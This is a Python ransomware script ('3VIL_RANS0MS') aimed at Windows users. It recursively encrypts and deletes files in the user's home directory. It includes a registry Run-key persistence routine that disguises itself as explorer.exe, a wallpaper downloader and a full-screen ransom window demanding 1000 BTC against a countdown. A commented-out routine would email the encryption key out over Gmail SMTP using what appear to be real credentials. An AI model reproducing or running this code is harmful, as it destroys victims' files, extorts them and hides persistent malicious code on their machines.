#Python 3
#BD TEST = C:\Users\abdallah\AppData\Local\Microsoft\Edge\User Data\Default\databases

 #FEATURES 
# --> PERSISTENCE  OK
 #--> APPAIR IS CENTER OK 
 #--> DISABLE KEYBOARD & MOUSE MEDUIM OK 
 #--> ADD WALLPAPER OK 
 #--> SEND KEY BY MAIL OK


from cryptography.fernet import Fernet 
import subprocess
import glob,os
import optparse
import ctypes
from tkinter import *
import requests,tempfile,shutil,sys,smtplib


#ext_list=["pdf","jpg","mp3","png","PNG","bd","py"]
ext_list=["dmt","dtv"]

#Ading zip , rar


exclude_list=["3vil_ransom.py","ys.jpg"]

encrypt_key=Fernet.generate_key()
f=Fernet(encrypt_key)



def get_username():
	return subprocess.check_output("echo %username%",shell=True).decode("utf-8").strip() #Python3
	#return subprocess.check_output("echo %username%",shell=True).strip()# Python 2

def find_sentivite_files(path,ext):
	return glob.glob(path+"\\**\\*."+ext,recursive=True)

def get_the_path(user):
	s=subprocess.check_output("cd",shell=True).decode("utf-8").strip()
	return str(s.split("\\")[0]+"\\Users\\"+user)

def write_data(filename,new_data):
	target_N=filename.split(".")[0]
	fileN=target_N+".3v1L"
	with open(fileN,"wb") as zr:
		zr.write(new_data)

def encrypt_data(file):
	with open(file,"rb") as dat:
		data=dat.read()
		encrypted_data=f.encrypt(data)
		write_data(file,encrypted_data)

def get_persistence():
	evil_path=os.environ["appdata"]+"\\explorer.exe"
	if not os.path.exists(evil_path):
		shutil.copyfile(sys.executable,evil_path)
		subprocess.call('reg add HKCU\\Software\\Microsoft\\windows\\CurrentVersion\\Run /v test /t REG_SZ /d "'+evil_path+'"',shell=True)



def send_email(email,password,message):
	server=smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()


def run_ransoms():
	username=get_username()
	path=get_the_path(username)
	#get_persistence()
	
	#img_path = path+"\\Desktop\\ys.jpg"
	for ext in ext_list:
		all_files=find_sentivite_files(path,ext)
		for  f in all_files:
				#print(f)
				encrypt_data(f)
				os.remove(f)

	end_graphical_message()

	#try:
	#	bg_url="https://www.bleepstatic.com/images/news/ransomware/r/retis/RANSOMWARE_RANSOM.png"
		
	#	temp_path=tempfile.gettempdir()
	#	os.chdir(temp_path)
	#	name=bg_url.split("/")[-1]
	#	local_path=temp_path+"\\"+name

	#	if not os.path.exists(local_path):
	#		downloader_img(bg_url)
	#		if downloader_img:
	#			changeBG(local_path)
	#			end_graphical_message()
	#	else:
	#		changeBG(local_path)
	#		end_graphical_message()
	#except Exception:
	#	pass

	#changeBG(img_path)
	#end_graphical_message()

def get_LocalRecursivescan(dir):
	for f in os.listdir(dir):
		if "." in f:
			if f in exclude_list:
				continue
			print("Fichier -->"+f)
			encrypt_data(f)
		else:
			print("Not Fichier -->"+f)
			go_to_folder(f)

def go_to_folder(dir):
		path=os.getcwd()+"\\"+dir
		os.chdir(path)
		get_LocalRecursivescan(path)

def changeBG(path):
	SPI_SETDESKWALLPAPER = 20
	ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
	return;

def downloader_img(url):
	req=requests.get(url)
	filename=url.split("/")[-1]
	with open(filename,"wb") as writer:
		writer.write(req.content)


def end_graphical_message():
	root=Tk()

	root.title("EVIL RANSOM")
	root.geometry("700x500")
	root.resizable(False,False)


	def disable_event():
		pass

	root.protocol("WM_DELETE_WINDOW",disable_event)
	
	Tk_Width = 700
	Tk_Height = 500

	
	x_Left = int(root.winfo_screenwidth()/2 - Tk_Width/2)
	y_Top = int(root.winfo_screenheight()/2 - Tk_Height/2)
	
	root.geometry("+{}+{}".format(x_Left, y_Top))

	# Segoe UI Black
	#Cascadia Code SemiBold

	lb=Label(root,text="3VIL_RANS0MS",font=("Segoe UI Black",24),bg="red",fg="white")

	message_lb=Label(root,text="Your Files Are Be Encrypted, for Decrypt It\n Send 1000BTC in this Adress Before 21 Hours : \n ThDY834SVZGJfsdabsozv52lzssz084Bcsvz",font=("Segoe UI Black",15))

	compteur_label=Label(root,font=("Segoe UI Black",60))

	def compteur(timing):
		 #exemple = 01:12:59
		

		time_var=timing.split(":")
		hour=int(time_var[0])
		minu=int(time_var[1])
		sec=int(time_var[2])
		#compteur_label['text']=hour+":"+minu+":"+sec
		compteur_label['text']="{}:{}:{}".format(hour,minu,sec)

		if sec > 0 or minu >0 or hour>0:
			if sec >0:
				sec=sec-1
			elif minu>0:
				minu=minu-1
				sec=59
			elif hour >0:
				hour=-1
				minu=59
				sec=59

			root.after(1000,compteur,"{}:{}:{}".format(hour,minu,sec))


	#lb.pack(side="top",expand="no",fill="both")
	lb.grid(row=0,column=0,padx=240)
	message_lb.grid(pady=(50))
	compteur_label.grid()

	compteur("21:59:10")

	root.mainloop()


#send_email("utm51984@gmail.com","DZOUMOGNE976","Encryption KEY ==> "+encrypt_key.decode("utf-8"))
run_ransoms()



#changeBG(path)
